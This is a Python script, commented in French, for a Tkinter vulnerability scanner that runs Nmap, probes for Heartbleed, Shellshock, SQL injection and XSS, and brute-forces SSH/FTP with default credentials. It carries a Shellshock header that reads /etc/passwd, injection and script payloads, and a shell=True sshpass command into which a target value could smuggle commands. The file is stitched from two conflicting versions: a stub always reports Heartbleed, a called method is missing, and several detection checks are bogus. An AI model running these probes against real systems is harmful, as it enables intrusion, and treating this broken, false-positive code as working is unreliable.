#!/usr/bin/env python3
"""
Script d'analyse de vulnérabilités avancé avec interface graphique.
Fonctionnalités :
- Scan de ports (TCP/UDP) avec Nmap.
- Détection de services vulnérables et versions obsolètes.
- Tests de vulnérabilités (Heartbleed, Shellshock, EternalBlue, SQLi, XSS, etc.).
- Brute-force SSH/HTTP/FTP.
- Génération de rapports (HTML/JSON/CSV).
- Interface graphique moderne avec ttkthemes.
- Logging et gestion des erreurs avancée.
"""

import socket
import ssl
import subprocess
import json
import argparse
import csv
import logging
import sys
import os
import time
import requests
import nmap
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Toplevel
from ttkthemes import ThemedTk
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Union, Callable, Set
from PIL import Image, ImageTk
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet
import threading
import queue
import platform
import webbrowser

# --- Configuration globale ---
REQUEST_TIMEOUT = 10
DEFAULT_PORTS = "1-1000"
LOG_FILE = "vulnerability_scan.log"
REPORT_DIR = "reports"
PLUGINS_DIR = "plugins"

# --- Vulnérabilités connues ---
KNOWN_VULNERABILITIES = {
    "Heartbleed": {
        "ports": [443],
        "test": "test_heartbleed",
        "description": "Vulnérabilité Heartbleed (CVE-2014-0160) dans OpenSSL.",
        "cve": ["CVE-2014-0160"],
        "severity": "Critical"
    },
    "Shellshock": {
        "ports": [80, 443, 8080],
        "test": "test_shellshock",
        "description": "Vulnérabilité Shellshock (CVE-2014-6271) dans Bash.",
        "cve": ["CVE-2014-6271"],
        "severity": "High"
    },
    "EternalBlue": {
        "ports": [445],
        "test": "test_eternalblue",
        "description": "Vulnérabilité EternalBlue (CVE-2017-0144) dans SMB.",
        "cve": ["CVE-2017-0144"],
        "severity": "Critical"
    },
    "SQL_Injection": {
        "ports": [80, 443, 8080],
        "test": "test_sql_injection",
        "description": "Test d'injection SQL basique.",
        "cve": [],
        "severity": "High"
    },
    "XSS": {
        "ports": [80, 443, 8080],
        "test": "test_xss",
        "description": "Test de vulnérabilité XSS basique.",
        "cve": [],
        "severity": "Medium"
    },
    "Default_Credentials": {
        "ports": [21, 22, 80, 443, 8080],
        "test": "test_default_credentials",
        "description": "Test d'identifiants par défaut (admin:admin, etc.).",
        "cve": [],
        "severity": "Medium"
    }
}

# --- Services vulnérables ---
VULNERABLE_SERVICES = {
    "OpenSSH": {"versions": ["<7.6", "<7.7"], "cve": ["CVE-2018-15473"], "severity": "High"},
    "Apache": {"versions": ["<2.4.38"], "cve": ["CVE-2019-0211"], "severity": "High"},
    "Nginx": {"versions": ["<1.15.6"], "cve": ["CVE-2018-16843"], "severity": "Medium"},
    "MySQL": {"versions": ["<5.7.26"], "cve": ["CVE-2019-2627"], "severity": "High"},
    "FTP": {"versions": ["vsFTPd 2.3.4"], "cve": ["CVE-2011-2523"], "severity": "Critical"}
}

# --- Identifiants par défaut ---
DEFAULT_CREDENTIALS = {
    "admin": ["admin", "password", "1234", "admin123"],
    "root": ["toor", "root", "1234", "password"],
    "user": ["user", "password", "1234"],
    "ftp": ["ftp", "anonymous", "guest"]
}

# --- Logging ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Classe principale de l'application ---
class VulnerabilityScannerApp:
    def __init__(self, root: ThemedTk):
        self.root = root
        self.root.title("Advanced Vulnerability Scanner")
        self.root.geometry("1200x800")
        self.root.set_theme("plastik")
        self.queue = queue.Queue()
        self.scan_running = False
        self.setup_ui()
        self.load_plugins()
        os.makedirs(REPORT_DIR, exist_ok=True)
        os.makedirs(PLUGINS_DIR, exist_ok=True)

    def setup_ui(self):
        """Configure l'interface utilisateur avec onglets."""
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Onglet Scan
        self.scan_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.scan_tab, text="Scan")
        self.setup_scan_tab()

        # Onglet Rapports
        self.report_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.report_tab, text="Rapports")
        self.setup_report_tab()

        # Onglet Plugins
        self.plugin_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.plugin_tab, text="Plugins")
        self.setup_plugin_tab()

        # Barre de statut
        self.status_bar = ttk.Label(self.root, text="Prêt", relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def setup_scan_tab(self):
        """Configure l'onglet de scan."""
        main_frame = ttk.LabelFrame(self.scan_tab, text="Paramètres de scan", padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Cible
        ttk.Label(main_frame, text="Cible (IP/Domaine):").grid(row=0, column=0, sticky=tk.W)
        self.target = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.target, width=50).grid(row=0, column=1, padx=5, pady=5)

        # Ports
        ttk.Label(main_frame, text="Ports:").grid(row=1, column=0, sticky=tk.W)
        self.ports = tk.StringVar(value=DEFAULT_PORTS)
        ttk.Entry(main_frame, textvariable=self.ports, width=50).grid(row=1, column=1, padx=5, pady=5)

        # Méthode de scan
        ttk.Label(main_frame, text="Méthode de scan:").grid(row=2, column=0, sticky=tk.W)
        self.scan_method = tk.StringVar(value="SYN")
        ttk.Combobox(main_frame, textvariable=self.scan_method, values=["SYN", "TCP", "UDP", "ACK"], width=47).grid(row=2, column=1, padx=5, pady=5)

        # Format de rapport
        ttk.Label(main_frame, text="Format de rapport:").grid(row=3, column=0, sticky=tk.W)
        self.report_format = tk.StringVar(value="json")
        ttk.Combobox(main_frame, textvariable=self.report_format, values=["json", "html", "txt", "csv", "pdf"], width=47).grid(row=3, column=1, padx=5, pady=5)

        # Boutons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=4, column=0, columnspan=2, pady=10)
        ttk.Button(button_frame, text="Lancer le scan", command=self.start_scan_thread).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Arrêter le scan", command=self.stop_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Effacer les logs", command=self.clear_logs).pack(side=tk.LEFT, padx=5)

        # Logs
        log_frame = ttk.LabelFrame(self.scan_tab, text="Logs", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, width=80, height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True)

        # Résultats
        result_frame = ttk.LabelFrame(self.scan_tab, text="Résultats", padding=10)
        result_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.results_tree = ttk.Treeview(result_frame, columns=("Port", "Service", "Version", "Vulnérabilité", "Sévérité", "CVE"), show="headings")
        self.results_tree.heading("Port", text="Port")
        self.results_tree.heading("Service", text="Service")
        self.results_tree.heading("Version", text="Version")
        self.results_tree.heading("Vulnérabilité", text="Vulnérabilité")
        self.results_tree.heading("Sévérité", text="Sévérité")
        self.results_tree.heading("CVE", text="CVE")
        self.results_tree.column("Port", width=60)
        self.results_tree.column("Service", width=120)
        self.results_tree.column("Version", width=100)
        self.results_tree.column("Vulnérabilité", width=200)
        self.results_tree.column("Sévérité", width=80)
        self.results_tree.column("CVE", width=120)
        self.results_tree.pack(fill=tk.BOTH, expand=True)

    def setup_report_tab(self):
        """Configure l'onglet des rapports."""
        frame = ttk.Frame(self.report_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)
        ttk.Button(frame, text="Ouvrir un rapport", command=self.open_report).pack(pady=10)
        ttk.Button(frame, text="Exporter les logs", command=self.export_logs).pack(pady=10)
        self.report_listbox = tk.Listbox(frame, width=80, height=20)
        self.report_listbox.pack(fill=tk.BOTH, expand=True, pady=10)
        self.refresh_report_list()

    def setup_plugin_tab(self):
        """Configure l'onglet des plugins."""
        frame = ttk.Frame(self.plugin_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)
        ttk.Button(frame, text="Charger un plugin", command=self.load_plugin).pack(pady=10)
        ttk.Button(frame, text="Recharger les plugins", command=self.load_plugins).pack(pady=10)
        self.plugin_listbox = tk.Listbox(frame, width=80, height=20)
        self.plugin_listbox.pack(fill=tk.BOTH, expand=True, pady=10)
        self.refresh_plugin_list()

    def load_plugins(self):
        """Charge les plugins depuis le dossier PLUGINS_DIR."""
        self.plugins = {}
        for filename in os.listdir(PLUGINS_DIR):
            if filename.endswith(".py") and not filename.startswith("_"):
                try:
                    module_name = filename[:-3]
                    module = __import__(f"plugins.{module_name}", fromlist=[""])
                    if hasattr(module, "register"):
                        module.register(self)
                        self.plugins[module_name] = module
                        logger.info(f"Plugin chargé: {module_name}")
                except Exception as e:
                    logger.error(f"Erreur de chargement du plugin {filename}: {e}")

    def refresh_plugin_list(self):
        """Met à jour la liste des plugins."""
        self.plugin_listbox.delete(0, tk.END)
        for name in self.plugins:
            self.plugin_listbox.insert(tk.END, name)

    def refresh_report_list(self):
        """Met à jour la liste des rapports."""
        self.report_listbox.delete(0, tk.END)
        for filename in os.listdir(REPORT_DIR):
            self.report_listbox.insert(tk.END, filename)

    def log(self, message: str, level: str = "info"):
        """Ajoute un message aux logs."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        if level == "error":
            logger.error(message)
        else:
            logger.info(message)

    def clear_logs(self):
        """Efface les logs."""
        self.log_text.delete(1.0, tk.END)

    def start_scan_thread(self):
        """Lance le scan dans un thread séparé."""
        if self.scan_running:
            messagebox.showwarning("Attention", "Un scan est déjà en cours !")
            return
        self.scan_running = True
        self.queue.queue.clear()
        threading.Thread(target=self.run_scan, daemon=True).start()
        self.log("Scan démarré en arrière-plan.")

    def stop_scan(self):
        """Arrête le scan en cours."""
        self.scan_running = False
        self.log("Scan arrêté par l'utilisateur.")

    def run_scan(self):
        """Lance le scan de vulnérabilités."""
        target = self.target.get()
        if not target:
            self.log("Erreur: Veuillez entrer une cible.", level="error")
            messagebox.showerror("Erreur", "Veuillez entrer une cible.")
            self.scan_running = False
            return

        self.log(f"[*] Début du scan pour {target}...")
        self.results_tree.delete(*self.results_tree.get_children())
        results = {"target": target, "open_ports": [], "vulnerabilities": []}

        try:
            nmap_results = scan_ports(target, self.ports.get(), self.scan_method.get())
            for proto in nmap_results.all_protocols():
                for port in nmap_results[proto]:
                    if not self.scan_running:
                        self.log("Scan arrêté par l'utilisateur.")
                        return
                    port_info = nmap_results[proto][port]
                    service = port_info["name"]
                    version = port_info.get("version", "")
                    results["open_ports"].append((port, service, version))
                    self.queue.put(("port", (port, service, version)))
                    self.check_vulnerabilities(target, port, service, version, results)

            # Génération du rapport
            report_file = generate_report(results, self.report_format.get())
            self.log(f"[+] Rapport généré: {report_file}")
            self.refresh_report_list()
            messagebox.showinfo("Succès", f"Scan terminé. Rapport: {report_file}")

        except Exception as e:
            self.log(f"[-] Erreur lors du scan: {e}", level="error")
            messagebox.showerror("Erreur", f"Erreur lors du scan: {e}")

        self.scan_running = False
        self.status_bar.config(text="Scan terminé")

    def check_vulnerabilities(self, target: str, port: int, service: str, version: str, results: dict):
        """Vérifie les vulnérabilités pour un port/service donné."""
        # Vérifie les vulnérabilités connues
        for vuln_name, vuln_data in KNOWN_VULNERABILITIES.items():
            if port in vuln_data["ports"]:
                test_func = globals().get(vuln_data["test"])
                if test_func:
                    is_vuln, status = test_func(target, port)
                    if is_vuln:
                        results["vulnerabilities"].append({
                            "name": vuln_name,
                            "status": status,
                            "port": port,
                            "service": service,
                            "severity": vuln_data["severity"],
                            "cve": vuln_data["cve"]
                        })
                        self.queue.put(("vuln", (port, service, version, vuln_name, status, vuln_data["severity"], ", ".join(vuln_data["cve"]))))

        # Vérifie les versions vulnérables des services
        for svc_name, svc_data in VULNERABLE_SERVICES.items():
            if svc_name.lower() in service.lower():
                for v in svc_data["versions"]:
                    if version and v in version:
                        results["vulnerabilities"].append({
                            "name": f"Version vulnérable de {svc_name}",
                            "status": f"Version {version} vulnérable",
                            "port": port,
                            "service": service,
                            "severity": svc_data["severity"],
                            "cve": svc_data["cve"]
                        })
                        self.queue.put(("vuln", (port, service, version, f"Version vulnérable de {svc_name}", f"Version {version} vulnérable", svc_data["severity"], ", ".join(svc_data["cve"]))))

        # Vérifie les identifiants par défaut
        if service.lower() in ["ssh", "ftp", "http", "https"]:
            is_vuln, status = test_default_credentials(target, port, service)
            if is_vuln:
                results["vulnerabilities"].append({
                    "name": "Default_Credentials",
                    "status": status,
                    "port": port,
                    "service": service,
                    "severity": "Medium",
                    "cve": []
                })
                self.queue.put(("vuln", (port, service, version, "Default_Credentials", status, "Medium", "")))

        # Exécute les plugins
        for plugin in self.plugins.values():
            if hasattr(plugin, "check_vulnerability"):
                plugin.check_vulnerability(target, port, service, version, results, self.queue)

    def process_queue(self):
        """Traite les éléments de la file d'attente."""
        while not self.queue.empty():
            item = self.queue.get()
            if item[0] == "port":
                _, (port, service, version) = item
                self.results_tree.insert("", tk.END, values=(port, service, version, "Aucune", "", ""))
            elif item[0] == "vuln":
                _, (port, service, version, vuln_name, status, severity, cve) = item
                self.results_tree.insert("", tk.END, values=(port, service, version, f"{vuln_name}: {status}", severity, cve))
        self.root.after(100, self.process_queue)

    def open_report(self):
        """Ouvre un rapport existant."""
        selection = self.report_listbox.curselection()
        if selection:
            filename = self.report_listbox.get(selection[0])
            filepath = os.path.join(REPORT_DIR, filename)
            if platform.system() == "Windows":
                os.startfile(filepath)
            else:
                webbrowser.open(f"file://{filepath}")

    def export_logs(self):
        """Exporte les logs vers un fichier."""
        log_content = self.log_text.get(1.0, tk.END)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_filename = f"logs/scan_log_{timestamp}.txt"
        os.makedirs("logs", exist_ok=True)
        with open(log_filename, "w") as f:
            f.write(log_content)
        self.log(f"Logs exportés vers {log_filename}")
        messagebox.showinfo("Succès", f"Logs exportés vers {log_filename}")

    def load_plugin(self):
        """Charge un plugin depuis un fichier."""
        file = filedialog.askopenfilename(initialdir=PLUGINS_DIR, title="Charger un plugin", filetypes=[("Fichiers Python", "*.py")])
        if file:
            try:
                module_name = os.path.basename(file)[:-3]
                spec = importlib.util.spec_from_file_location(module_name, file)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                if hasattr(module, "register"):
                    module.register(self)
                    self.plugins[module_name] = module
                    self.refresh_plugin_list()
                    self.log(f"Plugin chargé: {module_name}")
                else:
                    self.log(f"Le fichier {file} n'est pas un plugin valide.", level="error")
            except Exception as e:
                self.log(f"Erreur de chargement du plugin {file}: {e}", level="error")

# --- Fonctions de scan et tests ---
def scan_ports(target: str, ports: str = DEFAULT_PORTS, method: str = "SYN") -> nmap.PortScanner:
    """Scan des ports avec Nmap."""
    nm = nmap.PortScanner()
    try:
        logger.info(f"Scan de {target} (ports: {ports}, méthode: {method})...")
        nm.scan(hosts=target, ports=ports, arguments=f"-s{method} -sV --open")
        return nm
    except Exception as e:
        logger.error(f"Erreur Nmap: {e}")
        raise

def test_heartbleed(target: str, port: int = 443) -> Tuple[bool, str]:
    """Test Heartbleed."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(REQUEST_TIMEOUT)
        sock.connect((target, port))
        ssock = ssl.SSLSocket(sock)
        ssock.send(b"\x18\x03\x01\x00\x03\x01\x40\x00")
        response = ssock.recv(1024)
        ssock.close()
        if len(response) > 3:
            return True, "Vulnérable à Heartbleed !"
    except Exception as e:
        logger.error(f"Erreur Heartbleed: {e}")
    return False, "Non vulnérable."

def test_shellshock(target: str, port: int = 80) -> Tuple[bool, str]:
    """Test Shellshock."""
    url = f"http://{target}:{port}/cgi-bin/test"
    headers = {"User-Agent": "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"}
    try:
        r = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        if "root:" in r.text:
            return True, "Vulnérable à Shellshock !"
    except Exception as e:
        logger.error(f"Erreur Shellshock: {e}")
    return False, "Non vulnérable."

def test_sql_injection(target: str, port: int = 80) -> Tuple[bool, str]:
    """Test d'injection SQL basique."""
    url = f"http://{target}:{port}/login"
    payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--"]
    for payload in payloads:
        try:
            data = {"username": payload, "password": payload}
            r = requests.post(url, data=data, timeout=REQUEST_TIMEOUT)
            if "error" not in r.text.lower():
                return True, f"Vulnérabilité SQL détectée (payload: {payload})"
        except Exception as e:
            logger.error(f"Erreur SQLi: {e}")
    return False, "Aucune vulnérabilité SQL détectée."

def test_xss(target: str, port: int = 80) -> Tuple[bool, str]:
    """Test XSS basique."""
    url = f"http://{target}:{port}/search"
    payload = "<script>alert('XSS')</script>"
    try:
        r = requests.get(url, params={"q": payload}, timeout=REQUEST_TIMEOUT)
        if payload in r.text:
            return True, "Vulnérabilité XSS détectée !"
    except Exception as e:
        logger.error(f"Erreur XSS: {e}")
    return False, "Aucune vulnérabilité XSS détectée."

def test_default_credentials(target: str, port: int, service: str) -> Tuple[bool, str]:
    """Test des identifiants par défaut."""
    if service not in ["ssh", "ftp", "http", "https"]:
        return False, "Service non supporté."
    for user, passwords in DEFAULT_CREDENTIALS.items():
        for password in passwords:
            try:
                if service == "ssh":
                    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout={REQUEST_TIMEOUT} {user}@{target} -p {port} 'echo success' 2>/dev/null"
                    if subprocess.run(cmd, shell=True, capture_output=True).returncode == 0:
                        return True, f"Identifiants valides: {user}/{password}"
                elif service == "ftp":
                    from ftplib import FTP
                    ftp = FTP(target)
                    ftp.connect(target, port, timeout=REQUEST_TIMEOUT)
                    ftp.login(user, password)
                    ftp.quit()
                    return True, f"Identifiants FTP valides: {user}/{password}"
            except Exception:
                continue
    return False, "Aucun identifiant valide trouvé."

def generate_report(results: Dict, report_format: str = "json") -> str:
    """Génère un rapport dans le format spécifié."""
    os.makedirs(REPORT_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{REPORT_DIR}/report_{results['target']}_{timestamp}.{report_format}"

    if report_format == "json":
        with open(filename, "w") as f:
            json.dump(results, f, indent=4)
    elif report_format == "html":
        html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Rapport de scan pour {results['target']}</title></head>
        <body>
            <h1>Rapport de scan pour {results['target']}</h1>
            <h2>Date: {timestamp}</h2>
            <h2>Ports ouverts:</h2>
            <table border="1">
                <tr><th>Port</th><th>Service</th><th>Version</th></tr>
                {''.join(f'<tr><td>{p}</td><td>{s}</td><td>{v}</td></tr>' for p, s, v in results['open_ports'])}
            </table>
            <h2>Vulnérabilités:</h2>
            <table border="1">
                <tr><th>Port</th><th>Service</th><th>Vulnérabilité</th><th>Statut</th><th>Sévérité</th><th>CVE</th></tr>
                {''.join(f'<tr><td>{v["port"]}</td><td>{v["service"]}</td><td>{v["name"]}</td><td>{v["status"]}</td><td>{v["severity"]}</td><td>{", ".join(v["cve"])}</td></tr>' for v in results['vulnerabilities'])}
            </table>
        </body>
        </html>
        """
        with open(filename, "w") as f:
            f.write(html)
    elif report_format == "txt":
        with open(filename, "w") as f:
            f.write(f"Rapport de scan pour {results['target']}\n")
            f.write(f"Date: {timestamp}\n\n")
            f.write("Ports ouverts:\n")
            for p, s, v in results["open_ports"]:
                f.write(f"- Port {p}: {s} {v}\n")
            f.write("\nVulnérabilités:\n")
            for v in results["vulnerabilities"]:
                f.write(f"- Port {v['port']} ({v['service']}): {v['name']} - {v['status']} (Sévérité: {v['severity']}, CVE: {', '.join(v['cve'])})\n")
    elif report_format == "csv":
        with open(filename, "w", newline='') as f:
            writer = csv.writer(f)
            writer.writerow(["Port", "Service", "Version"])
            for p, s, v in results["open_ports"]:
                writer.writerow([p, s, v])
            writer.writerow([])
            writer.writerow(["Port", "Service", "Vulnérabilité", "Statut", "Sévérité", "CVE"])
            for v in results["vulnerabilities"]:
                writer.writerow([v["port"], v["service"], v["name"], v["status"], v["severity"], ", ".join(v["cve"])])
    elif report_format == "pdf":
        doc = SimpleDocTemplate(filename, pagesize=letter)
        styles = getSampleStyleSheet()
        elements = []
        elements.append(Paragraph(f"Rapport de scan pour {results['target']}", styles["Title"]))
        elements.append(Paragraph(f"Date: {timestamp}", styles["Normal"]))
        elements.append(Spacer(1, 12))

        # Ports ouverts
        elements.append(Paragraph("Ports ouverts:", styles["Heading2"]))
        data = [["Port", "Service", "Version"]] + [[p, s, v] for p, s, v in results["open_ports"]]
        table = Table(data)
        table.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, 0), (0.7, 0.7, 0.7)),
                                  ("GRID", (0, 0), (-1, -1), 1, (0, 0, 0))]))
        elements.append(table)
        elements.append(Spacer(1, 12))

        # Vulnérabilités
        elements.append(Paragraph("Vulnérabilités:", styles["Heading2"]))
        data = [["Port", "Service", "Vulnérabilité", "Statut", "Sévérité", "CVE"]] + [
            [v["port"], v["service"], v["name"], v["status"], v["severity"], ", ".join(v["cve"])] for v in results["vulnerabilities"]
        ]
        table = Table(data)
        table.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, 0), (0.7, 0.7, 0.7)),
                                  ("GRID", (0, 0), (-1, -1), 1, (0, 0, 0))]))
        elements.append(table)

        doc.build(elements)

    return filename


# --- Interface Graphique ---

REPORT_DIR = "reports"
KNOWN_VULNERABILITIES = {
    "Heartbleed": {"ports": [443], "test": "test_heartbleed"},
    "Shellshock": {"ports": [80, 8080], "test": "test_shellshock"},
    # Ajoute d'autres vulnérabilités ici
}

class VulnerabilityScannerApp:
    def __init__(self, root: ThemedTk):
        self.root = root
        self.root.title("Advanced Vulnerability Scanner")
        self.root.geometry("1000x700")
        self.root.set_theme("plastik")
        # Variables
        self.target = tk.StringVar()
        self.ports = tk.StringVar(value="1-1000")
        self.report_format = tk.StringVar(value="json")
        self.scan_method = tk.StringVar(value="SYN")  # Ajout de la méthode de scan
        self.log_text = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, width=80, height=20)
        self.results_tree = ttk.Treeview(self.root, columns=("Port", "Service", "Vulnérabilité", "Sévérité"), show="headings")
        # Widgets
        self.setup_ui()
        # Vérifie et crée le dossier de rapports
        os.makedirs(REPORT_DIR, exist_ok=True)

    def setup_ui(self):
        """Configure l'interface utilisateur."""
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Champ "Target"
        ttk.Label(main_frame, text="Cible (IP/Domaine):").grid(row=0, column=0, sticky=tk.W)
        ttk.Entry(main_frame, textvariable=self.target, width=40).grid(row=0, column=1, padx=5, pady=5)

        # Champ "Ports"
        ttk.Label(main_frame, text="Ports:").grid(row=1, column=0, sticky=tk.W)
        ttk.Entry(main_frame, textvariable=self.ports, width=40).grid(row=1, column=1, padx=5, pady=5)

        # Méthode de scan
        ttk.Label(main_frame, text="Méthode de scan:").grid(row=2, column=0, sticky=tk.W)
        ttk.Combobox(main_frame, textvariable=self.scan_method, values=["SYN", "TCP", "UDP"], width=37).grid(row=2, column=1, padx=5, pady=5)

        # Format du rapport
        ttk.Label(main_frame, text="Format du rapport:").grid(row=3, column=0, sticky=tk.W)
        ttk.Combobox(main_frame, textvariable=self.report_format, values=["json", "html", "txt"], width=37).grid(row=3, column=1, padx=5, pady=5)

        # Boutons
        ttk.Button(main_frame, text="Lancer le scan", command=self.start_scan_thread).grid(row=4, column=0, pady=10)
        ttk.Button(main_frame, text="Ouvrir un rapport", command=self.open_report).grid(row=4, column=1, pady=10)
        ttk.Button(main_frame, text="Effacer les logs", command=self.clear_logs).grid(row=4, column=2, pady=10)
        ttk.Button(main_frame, text="Quitter", command=self.root.quit).grid(row=4, column=3, pady=10)

        # Logs
        ttk.Label(main_frame, text="Logs:").grid(row=5, column=0, sticky=tk.W, pady=5)
        self.log_text.grid(row=6, column=0, columnspan=4, pady=5, sticky="nsew")

        # Résultats
        ttk.Label(main_frame, text="Résultats:").grid(row=7, column=0, sticky=tk.W, pady=5)
        self.results_tree.heading("Port", text="Port")
        self.results_tree.heading("Service", text="Service")
        self.results_tree.heading("Vulnérabilité", text="Vulnérabilité")
        self.results_tree.heading("Sévérité", text="Sévérité")  # Ajout de la colonne "Sévérité"
        self.results_tree.column("Port", width=80)
        self.results_tree.column("Service", width=150)
        self.results_tree.column("Vulnérabilité", width=200)
        self.results_tree.column("Sévérité", width=100)
        self.results_tree.grid(row=8, column=0, columnspan=4, pady=5, sticky="nsew")

        # Configuration des poids des colonnes/ligne pour le redimensionnement
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(6, weight=1)
        main_frame.rowconfigure(8, weight=1)

    def log(self, message: str):
        """Ajoute un message aux logs avec un timestamp."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)

    def clear_logs(self):
        """Efface les logs."""
        self.log_text.delete(1.0, tk.END)

    def start_scan_thread(self):
        """Lance le scan dans un thread séparé pour éviter de bloquer l'interface."""
        threading.Thread(target=self.run_scan, daemon=True).start()

    def run_scan(self):
        """Lance le scan de vulnérabilités."""
        target = self.target.get()
        if not target:
            self.log("Erreur: Veuillez entrer une cible.")
            messagebox.showerror("Erreur", "Veuillez entrer une cible.")
            return

        self.log(f"[*] Début du scan pour {target}...")
        self.results_tree.delete(*self.results_tree.get_children())  # Efface les anciens résultats

        try:
            results = {"target": target, "open_ports": [], "vulnerabilities": []}
            # Scan des ports avec la méthode choisie
            nmap_results = self.scan_ports(target, self.ports.get(), self.scan_method.get())

            for proto in nmap_results.all_protocols():
                for port in nmap_results[proto]:
                    service = nmap_results[proto][port]["name"]
                    version = nmap_results[proto][port].get("version", "")
                    results["open_ports"].append((port, f"{service} {version}"))
                    self.results_tree.insert("", tk.END, values=(port, f"{service} {version}", "Aucune", "Faible"))

                    # Tests de vulnérabilités
                    for vuln_name, vuln_data in KNOWN_VULNERABILITIES.items():
                        if port in vuln_data["ports"]:
                            test_func = globals().get(vuln_data["test"])
                            if test_func:
                                is_vuln, status, severity = test_func(target, port)
                                if is_vuln:
                                    results["vulnerabilities"].append({"name": vuln_name, "status": status, "severity": severity})
                                    self.results_tree.insert("", tk.END, values=(port, f"{service} {version}", f"{vuln_name}: {status}", severity))

            # Génération du rapport
            report_file = self.generate_report(results, self.report_format.get())
            self.log(f"[+] Rapport généré: {report_file}")
            messagebox.showinfo("Succès", f"Scan terminé. Rapport: {report_file}")

        except Exception as e:
            self.log(f"[-] Erreur lors du scan: {e}")
            messagebox.showerror("Erreur", f"Erreur lors du scan: {e}")

    def scan_ports(self, target: str, ports: str, method: str) -> nmap.PortScanner:
        """Effectue un scan des ports avec nmap."""
        nm = nmap.PortScanner()
        self.log(f"[*] Scanning {target} avec la méthode {method} sur les ports {ports}...")
        nm.scan(hosts=target, ports=ports, arguments=f'-s{method.lower()}')
        return nm

    def generate_report(self, results: dict, report_format: str) -> str:
        """Génère un rapport dans le format spécifié."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_name = f"scan_{results['target']}_{timestamp}.{report_format}"
        report_path = os.path.join(REPORT_DIR, report_name)

        if report_format == "json":
            with open(report_path, "w") as f:
                json.dump(results, f, indent=4)
        elif report_format == "html":
            self.generate_html_report(results, report_path)
        elif report_format == "txt":
            self.generate_txt_report(results, report_path)

        return report_path

    def generate_html_report(self, results: dict, report_path: str):
        """Génère un rapport au format HTML."""
        with open(report_path, "w") as f:
            f.write(f"<h1>Rapport de scan pour {results['target']}</h1>\n")
            f.write("<h2>Ports ouverts</h2>\n<ul>\n")
            for port, service in results["open_ports"]:
                f.write(f"<li>Port {port}: {service}</li>\n")
            f.write("</ul>\n<h2>Vulnérabilités détectées</h2>\n<ul>\n")
            for vuln in results["vulnerabilities"]:
                f.write(f"<li>{vuln['name']}: {vuln['status']} (Sévérité: {vuln['severity']})</li>\n")
            f.write("</ul>\n")

    def generate_txt_report(self, results: dict, report_path: str):
        """Génère un rapport au format texte."""
        with open(report_path, "w") as f:
            f.write(f"Rapport de scan pour {results['target']}\n\n")
            f.write("Ports ouverts:\n")
            for port, service in results["open_ports"]:
                f.write(f"- Port {port}: {service}\n")
            f.write("\nVulnérabilités détectées:\n")
            for vuln in results["vulnerabilities"]:
                f.write(f"- {vuln['name']}: {vuln['status']} (Sévérité: {vuln['severity']})\n")

    def open_report(self):
        """Ouvre un rapport existant."""
        file = filedialog.askopenfilename(initialdir=REPORT_DIR, title="Ouvrir un rapport", filetypes=[("Fichiers de rapport", "*.json *.html *.txt")])
        if file:
            os.system(f"xdg-open {file}" if os.name == "posix" else f"start {file}")

# Exemple de fonction de test de vulnérabilité
def test_heartbleed(target: str, port: int) -> tuple:
    """Teste la vulnérabilité Heartbleed."""
    # Logique de test ici (simulée)
    return (True, "Vulnérable à Heartbleed", "Critique")

def test_shellshock(target: str, port: int) -> tuple:
    """Teste la vulnérabilité Shellshock."""
    # Logique de test ici (simulée)
    return (False, "Non vulnérable", "Faible")


# --- Point d'entrée ---
if __name__ == "__main__":
    import importlib.util
    root = ThemedTk(theme="plastik")
    app = VulnerabilityScannerApp(root)
    root.after(100, app.process_queue)  # Lance la boucle de traitement de la file
    root.mainloop()
